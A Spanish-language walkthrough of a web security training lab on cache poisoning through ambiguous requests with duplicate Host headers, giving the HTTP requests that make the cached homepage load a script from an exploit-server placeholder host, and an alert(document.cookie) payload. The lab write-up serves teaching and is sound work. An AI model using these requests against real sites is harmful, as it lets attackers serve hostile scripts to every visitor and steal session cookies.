# 📡 Web cache poisoning por petición ambigua

## 📄 Descripción del laboratorio

Este laboratorio es vulnerable a **Web Cache Poisoning** debido a una discrepancia en cómo la caché frontal y el servidor backend interpretan peticiones HTTP ambiguas.

Un usuario víctima visita regularmente la página principal, lo que permite persistir una respuesta maliciosa en la caché.

El objetivo es envenenar la caché para que la página de inicio ejecute automáticamente el siguiente código JavaScript en el navegador de la víctima:

```javascript
alert(document.cookie)
```



## 📚 Teoría

### 📌 Web Cache Poisoning mediante discrepancias de parsing

El **Web Cache Poisoning** ocurre cuando un atacante consigue introducir contenido malicioso dentro de una respuesta que será almacenada en caché y servida posteriormente a otros usuarios.

Este laboratorio explota una discrepancia entre dos componentes del sistema:

* **La caché frontal**
* **El backend de la aplicación**

El problema aparece debido a **cabeceras `Host` duplicadas**.

El comportamiento vulnerable es el siguiente:

* El **backend** valida la petición usando **solo la primera cabecera `Host`**.
* Pero al construir URLs absolutas dentro del HTML utiliza **la segunda cabecera `Host`**.
* La **caché** considera la petición válida porque el primer `Host` es correcto.
* La respuesta manipulada se almacena sin detectar la discrepancia.

La página principal incluye un script cargado mediante una URL absoluta:

```
https://<HOST>/resources/js/tracking.js
```

Si conseguimos que `<HOST>` apunte a un dominio controlado por el atacante, cualquier usuario que reciba la respuesta cacheada cargará un script externo malicioso.

Este tipo de vulnerabilidad es especialmente peligrosa en aplicaciones con alto tráfico, ya que un único envenenamiento puede afectar a todos los usuarios durante el tiempo de vida de la caché.



## 📝 Práctica

### 1️⃣ Analizar el comportamiento de la caché

Interceptamos una petición normal a la página principal `/` y la enviamos a **Burp Repeater**.

<img width="768" height="95" alt="image" src="https://github.com/user-attachments/assets/b598fe87-3881-4af2-82f5-459efc9a157c" />
<br>

En la respuesta observamos la cabecera:

```http
Cache-Control: max-age=30
```

Esto indica que la página principal se almacena en caché durante **30 segundos**.

Para crear nuevas entradas de caché podemos utilizar parámetros en la query string.

Ejemplo:

```http
GET /?test=1
```

### 2️⃣ Identificar el recurso vulnerable

Analizando el HTML de la respuesta vemos que la página carga un script externo:

```
/resources/js/tracking.js
```

<img width="583" height="79" alt="image" src="https://github.com/user-attachments/assets/bd89e604-3064-4cca-82ec-92ef88d79621" />
<br>

La URL completa se genera dinámicamente utilizando el valor del `Host`.

Esto lo convierte en un posible punto de inyección.



### 3️⃣ Probar manipulación directa del Host

Intentamos modificar la cabecera:

```http
Host: test.com
```

<img width="768" height="296" alt="image" src="https://github.com/user-attachments/assets/a5643c1d-7112-459e-9d9a-f23603998b40" />
<br>

El servidor responde con un error (por ejemplo 504), lo que indica que el backend valida el host.

Esto sugiere que debemos utilizar una técnica más sutil.



### 4️⃣ Enviar una petición con doble cabecera Host

Enviamos una petición ambigua con dos cabeceras `Host`.

```http
GET /?cb=1 HTTP/1.1
Host: ID-LAB.web-security-academy.net
Host: test.com
```

<img width="768" height="307" alt="image" src="https://github.com/user-attachments/assets/b0a59cac-8e62-455c-ac0b-1eade1aa4635" />
<br>

Resultado:

* El backend valida la petición usando la primera cabecera.
* Pero la segunda cabecera aparece reflejada en el HTML.

En la respuesta observamos una referencia al script:

```
https://test.com/resources/js/tracking.js
```

Esto confirma la discrepancia entre la caché y el backend.



### 5️⃣ Preparar el script malicioso

Accedemos al **Exploit Server** del laboratorio.

Creamos el recurso:

```
/resources/js/tracking.js
```

Contenido del archivo:

```javascript
alert(document.cookie);
```

<img width="476" height="873" alt="image" src="https://github.com/user-attachments/assets/ce16cbc3-09b8-4e88-9e19-f14fe66590db" />
<br>

Este script se ejecutará cuando el navegador del usuario cargue el recurso externo.



### 6️⃣ Envenenar la caché

Ahora enviamos peticiones utilizando nuestro Exploit Server como segunda cabecera `Host`.

```http
GET /?cb=1 HTTP/1.1
Host: ID-LAB.web-security-academy.net
Host: EXPLOIT-SERVER-ID.exploit-server.net
```

Para asegurarnos de que la caché almacena la respuesta manipulada, enviamos varias peticiones con claves distintas:

```
/?cb=1
/?cb=2
/?cb=3
```

Todas con la doble cabecera `Host`.

La caché:

* considera válida la petición (primer `Host`)
* almacena la respuesta que referencia el script externo

<img width="768" height="307" alt="image" src="https://github.com/user-attachments/assets/87a59049-3caf-446d-909e-4795fd055146" />

### 7️⃣ Impacto en la víctima

Cuando un usuario visita la página principal:

1. Recibe la respuesta almacenada en caché.
2. El navegador intenta cargar el script:

```
https://EXPLOIT-SERVER-ID.exploit-server.net/resources/js/tracking.js
```

3. El script ejecuta:

```javascript
alert(document.cookie)
```

El laboratorio detecta la ejecución del `alert()` y se marca como completado.



### 8️⃣ Resultado

Mediante un ataque de **Web Cache Poisoning basado en petición ambigua** se ha conseguido:

* Aprovechar una discrepancia entre la caché y el backend.
* Manipular la URL de un script externo en la respuesta HTML.
* Envenenar la caché de la página principal.
* Ejecutar código JavaScript en el navegador de la víctima.

✅ El laboratorio queda resuelto.
